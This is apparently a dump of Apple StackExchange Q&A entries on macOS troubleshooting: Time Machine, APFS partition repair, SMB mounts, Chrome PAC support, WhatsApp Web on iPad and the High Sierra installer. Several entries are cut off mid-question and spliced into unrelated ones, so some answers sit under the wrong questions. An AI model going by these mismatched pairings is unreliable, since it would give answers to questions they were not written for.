sw_vers output:\nProductName:    Mac OS X\nProductVersion: 10.14.2\nBuildVersion:   18C54\n\nSystem Integrity Protection status: enabled\nThis is the essence of the script:\n$ads = $this->getApiAdAccount()->getAds($fields, $params);\n\n$ads->setUseImplicitFetch(true);\n$ads->rewind();\n\nif (!$ads->valid()) {\n    return false;\n}\n\nwhile ($ads->valid()) {\n    $adData = $ads->current()->getData();\n\n    try {\n        if (!Campaign::find($adData['campaign'])) {\n            dispatch(new ImportCampaign($adData['campaign']));\n        }\n\n        Ad::updateOrCreate(['id' => $adData['id']], $adData);\n    } catch (\\Exception $e) {\n        $this->error($e);\n    }\n\n    $ads->next();\n}\n\nThere is no specific spot it fails. I can run the Laravel job worker (redis queue) to process the code and insert/update the tiny array of data it processes on each loop.\nHow can I trace the source of this crash?\nI've tried dmesg and dmesg | grep -E -i -B100 'killed process' as suggested elsewhere, but no useful information comes out.\n\nA: The behavior you're seeing is not a problem with the hardware, the operating system, or lack or resources.\nInstead it is simply the way that Laravel queueing works. If the worker takes too long to process a job, there's a timeout and the worker is killed with signal 9. Similar if the memory usage exceeds a set amount, the worker is killed.\nYou can set these limits with for example the --memory option.\n", "Q: Force Outlook for Mac to sync I am trying to sync a 60GB mailbox on Outlook for Mac v15 over a VPN connection. Sometimes the VPN drops out and the sync is interrupted. When I come back to it and check the Sync Status window, it shows nothing, ie sync is complete and the main windows status bar says all folders are up to date.\nWhen I look at the Identity/Profile folder where the data is stored, the size does not reflect at all what the Exchange server is reporting. \nIf I come back later and try again, it might start syncing folders again and the status windows shows for example 1/2000 in a given folder are syncing. \nHow can I get force Outlook for Mac to get on with the sync and complete it instead of these dribs and drabs?\n\nA: Every sync is a full one, so there’s no “force” option. Two things I might try are resetting the local cache (which will purge all the downloads that happened so far) and verifying you don’t have download headers checked.\n\nYour main mailboxes sync by default and your shared mailboxes do not sync, so opt in to sync those if you have any and need them local as well.\nThe built in help and support would be my next suggestion if clearing the cache and toggling the Download / Sync and then saving prefs and then toggling again with a sync / check.\nIf you don’t have sync errors and see sync progress (Command 7 and Command 8 menu items), then the issue isn’t on your end, it’s on the server end and you’ll need your exchange admin / help system to engage there.\n", "Q: Unable to take screenshot in MacBook using shortcut shift+command+3/4 On macOS I type the key combinations: shift+command+3/4\n\n\n*While taking the screenshot sound is audible but the screenshot is not getting saved in desktop or anywhere.

Currently I perform a Time Machine backup on an external 1TB HD (let call it B). I use Photos with an external 2TB HD (let call it C) in order to maintain the library on an external HD.\n1) It is possible, with Time Machine, to backup an external HD into another external HD? I want to backup the Photo library of the HD (C) into an HD (D) (C and D are same size: 2TB) using Time Machine.\n2) It is possible to backup A into the external disk B with Time Machine and also, at the same time, backup C into D with the same Time Machine?\n\nA: By default, time machine excludes external drives that are mounted, but you can add them back into your backup in Time Machine \"options\" (found on the Time Machine Prefrence Pane). See here for more info: https://www.macworld.com/article/3153995/how-to-make-sure-time-machine-backs-up-external-drives.html\nTo add an external drive into the list of Time Machine Backup Drives, just use the \"Add Time Machine Backup Disk\" in the Time Machine preference pane.\nRegarding your Question (2), You can not direct a some of your backup to one time machine, and the rest to another, thought that would be a nice feature. I personally use an rsync script that runs nightly to solve a similar problem, though that's nowhere near as convenient (or user-friendly) as Time Machine.\n", "Q: Want to Restore Android Backup to iPhone I backed up my android phone (lg g7) to google, then sold the phone.  I no longer have it in my possession.\nI now have a new iphone xr and wish to restore that backup to my iPhone - call history, sms, etc.\nHow exactly do I do that?\nGoogling reveals two apps, \"Move to IOS\" and \"TransPhone\"... neither of which work in my case.\n\nA: All of the transfer methods I am aware of involve having the actual Android phone in hand to do the transfer. Apple has a utility and I think there are third-party utilities as well, but all require you to have the phone itself and not just a backup.\nAs Android is a product of Google you may find that there are iOS apps that will connect to Google's services and allow you to bring the data over from the Google cloud.\nMail, Calendar and Contacts will directly open a gmail account and suck in the data and, I believe will, Google's photos app for iOS. There are other equivalents but they all depend on those accounts being active and the iPhone connecting to the services to use that data.\nHowever I have never seen a utility that will \"restore\" an Android backup to an iPhone as the data formats are likely incompatible with the iPhone.\n", "Q: Changing sim cards on iPhone 5s I have changed my network provider and inserted their sim into my iPhone 5s.

I have been to Settings - Phone -  but where I expected to see Sim Card on the list - it just wasn't there.  How do I change the sim card code now?\n\nA: Settings > Mobile Data > Sim PIN\nThere's a Change PIN option there.\nI can't provide a picture as I've never used a SIM PIN, so the screen looks fairly uninteresting ;)\n", "Q: Can I change the iTunes library name with AppleScript? I manage my iTunes library on my iMac, but I got a headless Mac mini for streaming purposes to which I regularly synchronise the iTunes library via a shell script (run on the mini):\nosascript  -e \"try\" -e 'tell app \"Finder\" to mount volume \"smb://imacuser@iMac.local/imacuser\"' -e \"end try\"\nosascript -e 'tell app \"iTunes\" to quit'\nrsync -av --force --delete --size-only /Volumes/imacuser/Music/iTunes/ /Users/miniuser/Music/iTunes/\nosascript -e 'tell app \"iTunes\" to run'\nosascript -e 'display notification \"Done.\" with title \"Synchronising\"'\n\nThis works well, but afterwards both libraries can be found under the same name when using \"Remote\", for example. So the last thing I have to do on the mini is to go to iTunes preferences and change the library name.\nCan I automate this last step somehow via AppleScript?\n\nA: Yes, I can. I can automate the mouse keyboard actions necessary by scripting System Events. Since the AppleScript part of my shell script got bigger and bigger I converted into an AppleScript and called the shell from there:\n-- iTunes has to be closed\ntell application \"iTunes\"\n    activate\n    quit\nend tell\n\ntell application \"Finder\" to mount volume \"smb://imacuser@iMac.local/imacuser\"\n\nset results to do shell script \"rsync -av --force --delete --size-only /Volumes/imacuser/Music/iTunes/ /Users/miniuser/Music/iTunes/\"\n-- display dialog results -- uncomment this if you want to have a look\n\n-- Now here comes the renaming part\ntell application \"iTunes\" to activate\ntell application \"System Events\"\n    tell process \"iTunes\"\n        -- Open \"Preferences...\"\n        click menu item 3 of menu 1 of menu bar item 2 of menu bar 1\n        -- Click \"General\"\n        click button 1 of toolbar 1 of window 1\n        -- Rename Library   \n        delay 2\n        set value of text field 1 of group 1 of window 1 to \"Mac mini Lib\"\n        delay 2\n        -- Click \"OK\"\n        click button 1 of window 1\n    end tell\nend tell\n\n", "Q: Tried to fix filesystem type: FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF and probably made it worse I have a MacBook Air 11 inch which I recently tried to install Linux on with a swap partition and a root partition. In my stupidity I used the “disks” program under “try ubuntu now” to delete the Linux partitions and then extend the Mac partition. As a result the partition ended up having the filetype “FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF”. I searched around on Google and came across this:\nmacOS partition startup Volume type FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF\nI tried to use this to fix the error but have not been able to.

|................|\n00000600\n\n\nA: You need to post a hexadecimal dump of a few sectors of the internal drive. I need to see this before determining if a fix can be found. Unfortunately, Internet Recovery does not provide a hexadecimal dump utility. Therefore, I propose you do the following. Let me know if you have any problems.\nThe next step would be for you to post a hexdump of the first 3 sectors following the first partition. Below are the steps I would use to accomplish this task. These steps will not change the internal drive.\n\n\n*\n\n*Using the working Mac, format a flash drive for a single FAT32 volume labeled MyFat. The flash drive probably should be MBR partitioned, but I believe GPT partitioning will also work.\n\n*Boot the broken Mac to Recovery Mode.\n\n*Open a Terminal application window.\n\n*Insert the flash drive into a USB port on the Mac.\n\n*Enter the command given below. This will write out a binary copy of the first three 512 bytes sectors following disk0s1.\n\nNote: I assume the internal drive is disk0. If not, make the appropriate substitutions.\n\ndd if=/dev/disk0 count=3 skip=409640 of=/Volumes/MyFat/disk0.bin\n\n\n*Shutdown the Mac.\n\n*Insert the flash drive in the working Mac.\n\n*Enter the command given below in a Terminal application window.\nhexdump -Cv /Volumes/MyFat/disk0.bin\n\n\n*Post the output to your question. I would prefer you copy and paste the text to your question. An image (picture) is very inconvenient. \nOnce you have provided this dump, I will be able to determine how to proceed.\nUpdate #1\nThe third line, in the output you posted, shows the letters NXSB. This is a good indication that a APFS partition once resided at offset 409640. The hexadecimal sequence c8 d1 5a 01 00 00 00 00 appears on the same line. One can enter, into the Calculator application, these hexadecimal pairs in reverse order, as shown below.\n\nThis value can be converted to decimal by clicking on the 10 button. The result is shown below.\n\nNext, one can click on the x8= buttons to multiply by 8. The result is shown below. This is the value you should have used for the partition size instead of 372637568.\n\nNote: This step was required because your sector size is 512 bytes. This step can be skipped when the sector size is 4096 bytes.\n\n\nThis what you entered:\ndiskutil umountDisk disk0\ngpt add -i 2 -b 409640 -s 372637568 -t 7C3457EF-0000-11AA-AA11-00306543ECAC disk0\n\nThis is what you should have entered:\ndiskutil umountDisk disk0\ngpt add -i 2 -b 409640 -s 181833280 -t 7C3457EF-0000-11AA-AA11-00306543ECAC disk0\n\nReferences\nApple File System Reference, dated 2019-02-07, page 25.\n", "Q: Mac OS Mojave 10.14.1 File Sharing services off after restart I have a late 2014 Mac Mini, running Mojave 10.14.1, which I'm using as a file server to a few users in our lab.  The server will occasionally see power outages due to weather.\nThe machine reliably restarts after power outages, but the \"File Sharing\" service is deactivated.\n\n\n*\n\n*Is there a way to reliably start the File Sharing service, at boot time?\n\n*Does anyone know of a work-around, to activate the service from the command line? Ideally, I'd like to script a check -> inspect the service state, and start it if it's not running. \nI'd use \"cron\" to run the check every so often, unless someone has a better recommendation.\n\n\nA: I just upgraded to macOS Mojave 10.14.3.  Looks like Apple has fixed this bug.\nAnyone else having this problem: update to 10.14.3 or later.\n", "Q: How do I show All Files under the current folder? When I go to search and don't enter any limiting criteria, nothing shows up.  How do I show all files including in sub-folders under the current directory in the Finder?  The end goal is to sort all my files by date and be able to manipulate them in the Finder.\nI tried entering \"*\" in the search box.  The first time I did this it somehow got turned into search for a name containing \"*\" which showed nothing.  A second time I managed to just get \"*\" by itself, but only about 20,000 of 500,000 files were displayed.\n(note:  i rounded, the actual number of files shown/total are close to the above numbers but are not these exact round numbers)\n\nA: MacOS used to come with a feature called \"All My Files\", which did indeed show you ... all your files. But it was removed in High Sierra -- quite probably because showing you 500,000 files (as the result of a live search query) in one window would cause significant slow down.\nAll My Files was replace with \"Recent\", which shows you all the files created or modified within 1 day. You can modify this search, or create your own Smart Folder.\n\n\n*\n\n*Create a New Smart Folder in Finder's File menu. \n\n*Add criteria for \"Created Date\" and \"Content Modified\", both to be within some all-inclusive value, like \"within the last 35 years\". \n\n\nYou can then display the results in a list and sort by date.\n", "Q: How to configure the colors for Terminal Profiles I thought it might help me to color code some of my terminal windows, e.g. made my Redis terminal red.\nBut setting the color seems to have zero effect on the actual color of the terminal window\n\nThe result when the window is activated is still grey\n\nThanks for any info\n\nA: Just to the right of the colour selector, there's a setting that right now says \"Image: Solid Colors\". This means that Terminal will grab an image from some system directory containing solid-colour images and use that as a background, overriding whatever background colour you have set. Change that setting to \"No image\" (or something like that; my Mac is set to Swedish...) and it should work.\n", "Q: turn off mouse LEDs I have a Logitech 910-004845 G203 Gaming Mouse\nI want to turn off its LEDs all the time\nI tried  installing logitech gaming software, couldn't see a way to do it\nSo how can I do it?\nI know it's possible, the LEDs turn off when the laptop sleeps\n\nA: Only way to do it is through the software. Choose your mouse in the bottom left corner of the Logitech Gaming Software, and click on the colored lightbulb-- that is the light settings. Then there is an option to toggle off the LEDs.\n", "Q: How can I edit the Calendars shown on the Mac notification sidebar?

I'm referring to the popover menu that opens when clicking the little down arrow next to the file name in some apps.\nI use that extensively—it would be convenient if there were a keyboard shortcut to open it, but I haven't found one yet.\n\nA: I don't know of one, but you can of course use Command I (Get Info) in the Finder to change the name or assign Tags.\n\nA: Command + S when you have the file open. In finder maybe Command + space. Those are the only options I know...\n", "Q: Clever sysadmin needed! How to keep SMB shares mounted? We have multiple Mac OS/OSX servers (A mix of El Cap and High Sierra) that have SMB shares mounted for backing /archiving jobs (chronosync and P5)\nThe SMB shares are connected via \"connect to server\" and generally remain stable, but become unmounted randomly at least once every 1-2 days. \nMy question: Is there any way analyse the logs (We've looked in system.log) and find the reason for the unmount?\nThe goal here is to keep the SMB shares mounted at all cost.\nI've read around on StackExchange and tried analysing the network connections using the command from this post:\nSMB: auto-unmount then unable to re-mount without restart\nnetstat -I\nping -c 90 -i 10 your_SMB_server\ntail -f /var/log/system.log\n\nNo errors or issues with the packets found.\nI'm sure there's a sys admin expert out that must have solved this already ;)\nAppreciate any suggestions or ideas, however rudimentary\nThanks!\n\nA: Not certain I understand the context of your question, so let's try this first: \nThis has worked for me: \n\n\n*\n\n*Mount the SMB/CIFS share using Finder's Go, Connect to Server....  \n\n*If prompted for credentials, and given the option, store those credentials in the Keychain\n\n*Open System Preferences, Users and Groups; select the Login Items tab near the top \n\n*Click the + button at the bottom of the list of login items to \"add\" an item. \n\n*This will produce a new Finder window that allows you to select an item. Simply navigate to the mounted SMB/CIFS share from the Sidebar, select/highlight the SMB/CIFS share of interest, then click the Add button in the bottom right of the Finder window. \n\n\nThis should dismiss the Finder window, and now the share should be mounted at each login. Let us know if this doesn't work/isn't what you needed. \n", "Q: Different Google Drive icon in sidebar? I do not understand why in the sidebar there is not the Google Drive icon, while the folder in /Users/name/Google Drive has the right icon. How can I solve? Any idea?\n\n\nA: Sadly, this is simply not possible in macOS. The Google Drive app, and now its successor Backup and Sync from Google, give the actual folder named \"Google Drive\" its custom icon in the conventional way, much the same way you could paste a custom icon on any other folder.\nUnfortunately, all custom folder icons are ignored when displayed as Favorites in the Finder sidebar. You can confirm this by adding any folder with a custom icon to the sidebar. You can also show your home in List view to see that \"Google Drive\" does indeed have a custom icon optimized for that tiny display size. Finder is simply designed to ignore it, presumably to keep the Finder user interface as uniform as possible.\n\nA: I recommend using 'XtraFinder' or 'TotalFinder', which enable custom sidebar icons in Finder (and have many other useful features as well).\nThe 'Backup and Sync from Google' app that manages your Google Drive folder will reset the folder icon - but you CAN make it retain a custom icon easily;\nWithin your primary 'Google Drive' folder, create a sub-folder and name it 'Google Drive'.\nApply your custom icon to this folder, and drag it into the sidebar.\nNow, your folder icon will not be reset when 'Backup and Sync' runs or updates.\nUnfortunately the standard version of Finder does not display custom icons. \nHOWEVER, you can work around this a few different ways. \nTotalFinder and XtraFinder are two great apps that I've used with great success, and both allow custom (and colorful!) folder icons.\nYou can use a custom icon for your Google Drive folder by right-clicking on your folder, clicking 'Get Info', then dragging and dropping your icon file onto the folder icon in the upper-left corner of the folder info panel.\nThere is a minor problem with this, however - the 'Backup and Sync' app replaces any custom folder icon with the generic Google Drive folder icon. This happens irregularly, every few days or so, and it's a pain in the butt to repeat the process. \nFortunately, you can fix this issue (permanently) by replacing the .icns files in the Backup and Sync app itself with your custom .icns file, which should prevent the folder from reverting to the standard icon.\n\nA: You could try locking your custom icons. (You have to view invisible files to do this.)  At first it didn't work, then the next morning I had custom icons in my Google Drive folder.\nApple is making the finder more boring (you called it \"uniform\", yeah) as time goes by. Remember the OS( app that you could design your own candy-striped windows and colorful icon themes?  Mac used to be fun!\nMacForger also has a cheap plugin for colorful sidebars.  But none seem to make colorful dialogue boxes (the finder option when you export or save as.)\nYou still have to hunt among the grey files. Yawn.\n", "Q: 'Team Forestress 2' won't delete? It takes up a lot of storage(20 GB), and I can't locate it in finder either. I can only see it in storage settings, where it won't delete. I also don't have steam anymore.\n\nA: macOS apps like Steam try to keep files you're not supposed to interact with directly (like the resource files needed to run Team Fortress 2) tucked away in the normally-invisible \"Library\" folder. You can either reinstall Steam, and tell it to uninstall TF2, or you can manually remove the files it left behind. To manually remove it:\n\n\n*\n\n*Start in the app, Finder\n\n*Open the Go menu\n\n*Hold option—you'll see a new item appear; Library\n\n*Click Library to open it (then release\noption)\n\n*Open Application Support\n\n*Drag the Steam folder to the trash\n\n\nNote that there may be files you care about, like non-cloud-syncing game saves or other Steam apps, in that Steam folder. Almost everything in Steam can just be re-downloaded later, but in doing the above you naturally assume the risk of damaging or losing anything stored there.\nHaving typed all that, naturally I just found the Steam Support article saying the same things.\n", "Q: How to posterize image with Procreate How to posterize image using Procreate? Even Google is silent on that. Maybe they have a different name for that effect. I am looking for an effect which reduces the number of colors similarly as in GIF file. \n\nA: Posterization: What, Why, and How:\nDefinition:\n\nPosterization in art is a method of reducing the tonal range in an image, that is, reducing the range of colors.  This converts areas with subtle gradations of color into flat areas of color without any gradations; what were gradations in the original photograph appear as sudden changes in color shade. This process has been and is a frugal method for printing posters in the limited number of shades of color one has available. (excerpted and paraphrased from Maini’s Mind)\n\nFamous post-modern posterized artworks include Andy Warhol’s body of “Pop Art” work, which was first exhibited in 1961. His Campbell’s Soup Can corpus was part of the Pop Art movement which launched the Post-Modern Art Era.  (Widewalls.ch) \nThe Obama Campaign’s “Hope” poster in 2008 has prompted innumerable knockoffs, a worldwide phenomenon fueled by a plethora of apps and websites allowing anyone to easily create their own selfie “Hope Poster”.\n\nWhy Posterize?\n\nWhat would induce a creative individual to purposefully edit out, cut away, basically lose information and details from an image? Going from say 128 tones down to 4 changes everything. Practical applications include simplifying the composition by removing that which is cluttering and distracting, and the removal of the background of an image bringing the focus forward to the main subject. (excerpted and paraphrased from Maini’s Mind)\n\nBecause unpredicted shapes and ideas emerge in this process of simplification and reduction, the artist’s mind and hand are enabled to create something totally new: \n\n“Unexpected happenings are encouraged through a serendipitous, intuitive openness to possibilities. Although these efforts do not guarantee achieving the goal of each picture, fresh, exciting results are instigated whenever stepping off known paths.” (Bonnie R. Beaver) \n\nHow to Posterize a Photograph in Procreate\nThrough experimentation, I have found ways to achieve a range of posterization effects in Procreate using the Selection Tool. It seems as if the sky is the limit...\nStep 1: Choose your Image and Palette; Make and Color Selections\nBegin with an unedited photo. In my experience, if a filter or even Camera Roll editing have already been applied, it can be difficult to obtain nice clean lines and fields of color in the final result. The exact characteristics of the photo you choose turn out to be less important than you would think: take risks and expect the unexpected! What do you have to lose????\nMany artists like to work out a palette concept before they begin painting. This is a fun and intuitive task in Procreate: here is a great tutorial. Don’t feel bound to a palette, however. In Step 4 below I will tell you how to easily play with your artwork’s colors once all of the areas have been selected and painted.\nSo onward: use the Automatic Selection Tool to choose several areas to transform into your first color choice. (Here is a Tutorial on Procreate’s Automatic Selection Tool) Here I have selected the fence for my first color. Choosing small details like this first, which you want showcased in your composition, sets them apart and thus keeps them from becoming buried in or morphed with other color choices later on\n\nWhen you are satisfied with your area selections, choose a color and a brush, and paint the selected areas. \n\nStep 2: Rinse, Repeat, Don’t Fret Too Much!\nRepeat Step 1 for as many colors as you desire. Many artists like to choose an odd number of colors which is thought to add interest and harmony to an artwork.\nTo prevent any gaps in the final composition, which would allow the original photo to show through, try to select and paint every part of the image. But don’t fret about this too much either, as the next step will take you through an easy work-around.\n\nStep 3: Check for and fix any missed areas.\nOnce you have all of the areas selected and colored, you will want to make certain you haven’t missed anything, as you don’t want any of your original photo to show on your finished artwork. Check closely by zooming in and examining the entire image.\n\nIf small areas are found, there are many possible ways to fix them: the easiest is to use the Color Drop tool to select the color you want to cover the hole with, make sure it is at maximum opacity, choose a pen, and paint over it.\nIf there are too many holes which are tiny (such as a grainy patch), they are in a tricky spot to paint over without messing up other elements of the image, or you just aren’t in the mood to paint over each of them individually (sometimes it is painstaking work), try this: \n\n  \n*\n  \n*Set your background to a bright color NOT USED in your artwork. \n  \n*Using the Automatic Selection Tool, choose everything in the image but those holes. (Alternatively, if the holes are only in one specific area, you can apply this technique to just that area of the artwork.) This may require some back-and-forth fussing with the Threshold level, which will over-select if left too high. Be precise with your stylus (this will be much easier with an Apple Pencil!) Remember you can always “Go Back” with the two-finger tap, at any stage...  Experiment and you will get the hang of it. \n  \n*Once you feel satisfied that the holes are the only areas not selected, select the brush tool, which will kick the Selection Tool into the mode showing the UN-selected (protected) area under undulating diagonal stripes. The holes at this point are UN-Selected, so using your finger or stylus, long-press the Selection (“S”) Icon, then click “Invert”. Now the holes should be free of the diagonal stripes, meaning they are “selected” and can thus be altered, and you can erase them. Because you changed the background color to a recognizable color against the rest of the image, you will be able to tell when you are erasing the holes.\n  \n*Create a new layer BELOW the image, and fill it with a color which will show through the holes and make them seamlessly blend into the work. You can even paint holes in different areas of of the image specific colors to get this to work. \n  \n*Merge down when you are happy.\n  \n\nStep 4: Tweak your color scheme to your heart’s content.\nThe beautiful thing about posterizing in Procreate is that it almost doesn’t matter at all what colors you pick initially, because you can change them so easily, with many different methods, including the Automatic Selection Tool, several different features under the Adjustments (“Magic Wand”) Icon, and even the Layer Modes which are located under each individual layer.\nIn my example above, I was underwhelmed by the final result, mainly due to the palette striking me as very blah. So as you can see, I changed it! Here is my final result: notice that the grass that was showing through has been replaced with black (a common color in posterized art, due to its high contrast).\n\nAlternative Posterization Effects\nHere are a few examples of posterized works in which I chose additional techniques which depart from the flat field effect. These involve the use of textured brushes to layer colors, and applying ombre effects to selected areas.\nOMBRE EFFECT: For this piece, each selection area was painted with swooping horizontal stripes of graduated color, then made into an ombre using the Gaussian Blur tool, which is under the Adjustments Icon:\n\nLAYERED COLORS: Here I brushed layered colors into selected areas with the “Canvas” Brush on partial opacity. Using a dark version of a complimentary color under a bright version of its counterpart can really make colors POP! \nLAYERED COLORS, DIFFERENT BRUSH: Using the same technique but with the Nikko Brush: \n\n", "Q: How can I change x11 window size programatically? How can I change the size of an x11 window with a script, be it AppleScript or otherwise. I have a process running using wine which is using XQuartz as the windowing system and I want to force the x11 window to a particular size.\n\nA: You can install Homebrew and use it to install wmctrl using the following command:\n  brew install wmctrl\n\nThen run wmctrl like this:\nwmctrl -l\n\nIt should give you a list of all the available windows on screen. Take the ID for the game window and run:\nwmctrl -i -r windowid -e 0,0,0,1600,1200\n\nwhere windowid should be replaced with the ID of that window.\nNote: I don't think your mission is likely to succeed, as most programs that do not offer resize handles are not able to handle resizing their windows at all. You'll probably end up with the contents being the same size as always, and then just a white/black color for the rest of the enlarged window.

If you don't reboot, you will have to wait some (undeterminable) amount of time for your change to take effect.\n\nA: I found an answer that works elsewhere on Apple StackExchange.\nBasically, just right click (control click) on the file type you want to change (e.g., mp4) and click \"Get Info.\"\nThen, simply select your application from the Dropdown Menu and click \"Change All.\" \n", "Q: Moving photos from Photos app to my iPhone I have photos in the photos app on my Mac from a previous \"back up\" and now I would like to bring them back to my phone without having to use iCloud photo library. Is there a way to do it? \n\nA: I would first send the photos on your iPhone back to your Mac using AirDrop. This way you will get ALL iPhone photos on your mac, which you can then import in the Photos app on your Mac. After that you can then sync all photos back to your iPhone with iTunes:\n\n\n*\n\n*First make a successful backup of your iPhone with iTunes.\n\n\nIphone:\n\n\n*\n\n*Settings -> General -> AirDrop -> Contacts only\n\n\nMac:\n\n\n*\n\n*Open Finder\n\n*Click Go in the menu bar and select AirDrop\n\n*Allow me to be discoverd by -> Contacts only\n\n\nIphone:\n\n\n*\n\n*Open Photos\n\n*Select all photos\n\n*Tap the sharing button\n\n*Wait untill AirDrop finds your Mac and click it\n\n\nMac:\n\n\n*\n\n*accept the popup window asking you to accept the photos\n\n*Import the Photos to the Photos app\n\n*Lastly, you can now sync your iPhone with iTunes to transfer all photos/the albums you want to your iPhone. But note that this will erase the media items synced with the previous library (music,podcasts,audiobooks etc.)\n", "Q: Use an external disk shared to Mac via Windows for Time Machine I have an external hard drive with 3 partitions partitions a exFAT connected to a Windows 10 PC. I am able to mount and access the disks on my Mac wirelessly but cannot get TimeMachine to use this partition as a TimeMachine backup disk.\nI am mounting it on my Mac using smb://XXX.XXX.XXX.XXX. I have also tried changing the unsafe disk property using the terminal command:\n\nsudo defaults write com.apple.systempreferences TMShowUnsupportedNetworkVolumes 1\n\nAnyone have any ideas how to get this to work?\n\nA: Actually you are missing only one thing, TimeMachine will ONLY write to an HFS+ formatted disk so you need to backup to a sparseimage disk image file.\nCreate the sparseimage disk image with Disk Utility, be sure to select the image type as Sparse Image and the format as HFS+. Make it as big as the partition you are putting it on less a bit. The created disk image will only be a couple hundred MB.\nIf you are on Mojave even if you select HFS+ as the disk image it may be created as an APFS format. So you will need to mount the image, select it in Disk Utility and reformat it as HFS+.\nNow you need to go into terminal and tell TimeMachine about the new backup volume that you have mounted from the SMB share:\nsudo tmutil setdestination \"/Volumes/TimeMachineBackups/\"\n\nWhere \"TimeMachineBackups\" is the name of your mounted Time Machine disk image.\nNow just set that volume to mount at startup under System Preferences > Users > Startup Items and you should be good to go.\nI recently did this at work and it works great.\n\nA: As of BigSur, timeMachine uses the APFS format, and what's really tricky here, is that it relies on snapshot technology for performing backups and restores. This replaces a lot of the internal TimeMachine logic with logic that is internal to the filesystem. Migrating from one to other isn't well-documented AFAIK. Presumably you can keep both, but you should probably add a new APFS volume for newer backups.\n", "Q: Creating a bootable USB I am trying to restore a dead windows machine, all I have access to currently is an old mac. I am trying to accomplish this by downloading the Win 10 1809 iso and creating a bootable USB stick with it.\nMost search and stackexchange results walk through doing this with Boot Camp assistant, however it appears this ability has been removed in OSX 10.14, as I get an error message when I try to launch boot camp with any usb devices plugged in. \nIs there a workaround or other suggested way to do this? I have attempted downloading a few free tools which do not seem to work for various reasons, just wondering if I'm missing something obvious built into the OS before I start trying to dive into a specific tool to figure out what the problem is. \n\n\nA: One way get a current 100% genuine Windows 10 USB flash drive would be to run the MediaCreationTool18.09.exe application. This would require Windows. To get Windows you would have to download the latest Windows 10 ISO file and install Windows a virtual machine. Oracle offers A free virtual machine called VirtualBox. I believe you will need to instal the Oracle VM VirtualBox Extension Pack after installing VirtualBox.\nThe link to get the MediaCreationTool18.09.exe application is given here. However, you can not access this link from macOS. You will need to click on the link while running a web browser under Windows. See this answer for an explanation.\nA possible alternative would be to MS-DOS (FAT) format (using the Master Boot Record Scheme) a flash drive and copy all the files from the Windows 10 April 2018 Update ISO file to the flash drive. If you use the Windows 10 October 2018 Update ISO file, then the flash drive will need to be ExFAT formatted. These ISO files can be downloaded from this website.\n\nNote: The official Windows 10 USB installer is FAT32 formatted. There is no guarantee your PC can boot from a ExFAT formatted USB flash drive.\n\n", "Q: How to partition free space in a Mac SSD I have a Mac with a 250Go SSD. I used to have a Windows partition, but as I had no longer any use for it I wanted to free up its space.\nMy error was here : instead of using BootCamp helper to delete my Windows partition, I deleted the space in the Disk Utility app.\nNow, I am in this situation when I open my Disk Utility:\n\nSo there are clearly 2 free spaces of 30Go each on the drive (which is weird since it says there are 251Go total, and if we sum up the 3 spaces here it gives something like 280 Go).

At one point in time, Whatsapp web functioned on the iPad Safari browser.\nAttempting to summon it on an iPad doesn’t return the desktop website. Summons are invoked by long tapping the reload button in the address bar and tapping on Request Desktop Site.\nWhat can be done to summon and return the WhatsApp QR code on Safari running on iPad? The goals is to use WhatsApp Web in Safari on iPad.\n\nA: With the latest edition of iPadOS which will be released on September 30th (source), Safari has been turned into a \"desktop-class browser\" (Apple) and therefore WhatsApp Web can be used on iPad.\nI have tried it on the Safari browser on the current iPadOS beta and WhatsApp Web works like a charm.\n\nA: It’s not possible to run WhatsApp Web on Safari running on iPad/iOS. This restriction is imposed by WhatsApp website backend.\nRequest to load desktop website is not honoured by the WhatsApp web app backend, as the Web interface to the app is meant to be accessed only on a desktop computer. This is a limitation imposed by WhatsApp and has nothing to do with iPad/iOS.\nUsers can request to load desktop version of any website when accessing it using Safari for iOS, but the same can be dishonoured by the website’s server at its own discretion.\n\nA: Here how i did this by overriding user agent. Note this is related to Swift and programmer who want to access web whatsapp in webview. In order to open in Safari simply long press the refresh button in address bar and you will see an option \"Desktop version\"\n@IBOutlet weak var webView:WKWebView!\n\n let url = URL(string: \"https://web.whatsapp.com/\")!\n    let urlRequest = URLRequest(url: url)\n    webView.navigationDelegate = self\n    webView.customUserAgent = \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36\"\n    webView.load(urlRequest)\n\n\nA: Click on the AA icon in the Safari web browser tab on your iPad.

If I start Chrome up, it runs all well for a while (ranging from 5 minutes to a few hours). Then Chrome stops responding. It won't load any pages. Funny thing is, after that  if I try to access Safari, even that stops responding until I restart the system. If I switch back to the Chrome 65, everything starts to work fine.\nThis is happening with all Chrome versions that have been released ater Chrome 65. I have seen this issue on both High Sierra and Mojave.\nMy company uses a PAC file for automatic proxy configuration.\n\nA: Google Chrome has stopped supporting PAC files for proxy configuration. The decision is definitive, as explained in this issue comment:\n\n[...] marking this as WontFix to indicate that the deprecation will stick -- we will not be supporting file:// URLs when the Network Service is enabled, and will be deprecating support completely in the future.\nThe current usage is primarily from file:// URL in system proxy settings, which is an incorrect interpretation of the settings on macOS and Windows.\nInstead of file:// URL in system proxy settings, one can set a PAC script from local sources using Chrome's internal proxy settings. The emphasis moving forward will be on exposing a common set of capabilities through Chrome's settings rather than inconsistent capabilities from system proxy settings.\nThe biggest limitation is that there is currently no UI for managing Chrome's proxy settings (noted in Issue 937413). So one must install a Chrome extension to modify these settings if not using the system proxy settings.\n\n", "Q: Japanese kana layout on iPad screen keyboard How can I get ordinary kana layout instead of the sorted あいうえお?

But I want to upgrade the OS to High Sierra, not Mojave.\nHow do I do this?\n\nA: If you're in the US, go to this link.\nNote: Links to all macOS downloads from Leopard to Mojave are listed on this page at Krypted.com.\n\nA: I needed to do something similar recently, and I found the downloaded High Sierra I had saved was corrupt in some way, and I re-downloaded via the App Store…which gave me a stub installer (about 20MB) rather than the full 5.7GB version.\nThe way I found to force the full download from Apple was to use High Sierra Patcher Tool from dosdude1.com -- download it, unzip the archive, run the app inside (you will likely need to right-click -> open as the developer is not recognised). Ignore all the stuff about patching your system, clear any dialogs about your system already being supported (if they appear and choose Tools -> Download macOS High Sierra…:\n\nThe patcher app will ask you for confirmation:\n\nSelect Yes and it will start downloading the full installer:\n\nAt the end of this process, you'll have a working self-contained High Sierra installer. The patcher will ask if you want to make a patched USB installer -- answer Not now to this:\n\nLocate the download in your chosen folder, and you should have a 5.7GB portable installer:\n\nAfter you've installed High Sierra, you can change the macOS update settings to defer (possibly indefinitely, to be confirmed) the 